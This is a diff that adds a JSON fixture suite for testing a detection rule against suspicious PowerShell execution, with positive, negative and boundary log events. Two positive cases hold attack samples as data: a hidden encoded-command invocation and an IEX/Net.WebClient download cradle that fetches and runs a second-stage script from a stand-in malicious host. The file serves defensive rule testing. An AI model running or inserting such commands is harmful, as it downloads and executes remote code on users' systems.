@@ -1,0 +1,103 @@
+{
+  "schema_version": "cops.detection-fixtures/v1",
+  "fixture_suite_id": "FIXTURE-SUITE-SPL-POWERSHELL-01",
+  "target_rule_id": "RULE-SPL-DEFENDER-POWERSHELL-EXEC",
+  "description": "Validation suite for suspicious PowerShell execution rule.",
+  "cases": [
+    {
+      "case_id": "CASE-SPL-POS-01",
+      "description": "True positive: ScriptBlock logging base64 encoded command invocation",
+      "label": "positive",
+      "expected_match": true,
+      "tags": ["encoded_command", "attack"],
+      "events": [
+        {
+          "_time": "2026-10-01T14:00:00Z",
+          "EventCode": 4104,
+          "ScriptBlockText": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgA...",
+          "Computer": "WORKSTATION-09.corp.internal",
+          "User": "CORP\\alice"
+        }
+      ]
+    },
+    {
+      "case_id": "CASE-SPL-POS-02",
+      "description": "True positive: Web download cradle using Net.WebClient and DownloadString",
+      "label": "positive",
+      "expected_match": true,
+      "tags": ["download_cradle", "attack"],
+      "events": [
+        {
+          "_time": "2026-10-01T14:15:00Z",
+          "EventCode": 4104,
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://update.delivery-cdn.xyz/stage2.ps1')",
+          "Computer": "SRV-FILE-01.corp.internal",
+          "User": "NT AUTHORITY\\SYSTEM"
+        }
+      ]
+    },
+    {
+      "case_id": "CASE-SPL-NEG-01",
+      "description": "True negative: Benign administrative process listing",
+      "label": "negative",
+      "expected_match": false,
+      "tags": ["benign", "admin_activity"],
+      "events": [
+        {
+          "_time": "2026-10-01T11:00:00Z",
+          "EventCode": 4104,
+          "ScriptBlockText": "Get-Process | Where-Object { $_.CPU -gt 10 } | Format-Table Id, ProcessName, CPU",
+          "Computer": "WORKSTATION-02.corp.internal",
+          "User": "CORP\\sysadmin"
+        }
+      ]
+    },
+    {
+      "case_id": "CASE-SPL-NEG-02",
+      "description": "True negative: EventCode 400 (Engine start), not script execution",
+      "label": "negative",
+      "expected_match": false,
+      "tags": ["different_eventcode"],
+      "events": [
+        {
+          "_time": "2026-10-01T11:05:00Z",
+          "EventCode": 400,
+          "ScriptBlockText": "Engine state is changed from None to Available.",
+          "Computer": "WORKSTATION-02.corp.internal",
+          "User": "CORP\\sysadmin"
+        }
+      ]
+    },
+    {
+      "case_id": "CASE-SPL-BND-MISSING",
+      "description": "Boundary case: Event missing required ScriptBlockText field",
+      "label": "boundary",
+      "expected_match": false,
+      "tags": ["missing_field"],
+      "events": [
+        {
+          "_time": "2026-10-01T11:20:00Z",
+          "EventCode": 4104,
+          "Computer": "WORKSTATION-02.corp.internal",
+          "User": "CORP\\sysadmin"
+        }
+      ]
+    },
+    {
+      "case_id": "CASE-SPL-BND-SUBSTR",
+      "description": "Boundary case: Benign script mentioning word complex without cradle",
+      "label": "boundary",
+      "expected_match": false,
+      "tags": ["string_boundary"],
+      "events": [
+        {
+          "_time": "2026-10-01T11:45:00Z",
+          "EventCode": 4104,
+          "ScriptBlockText": "# This is a complex function for log analysis\nWrite-Output 'Analysis Completed.'",
+          "Computer": "SRV-BACKUP.corp.internal",
+          "User": "CORP\\backup_svc"
+        }
+      ]
+    }
+  ]
+}
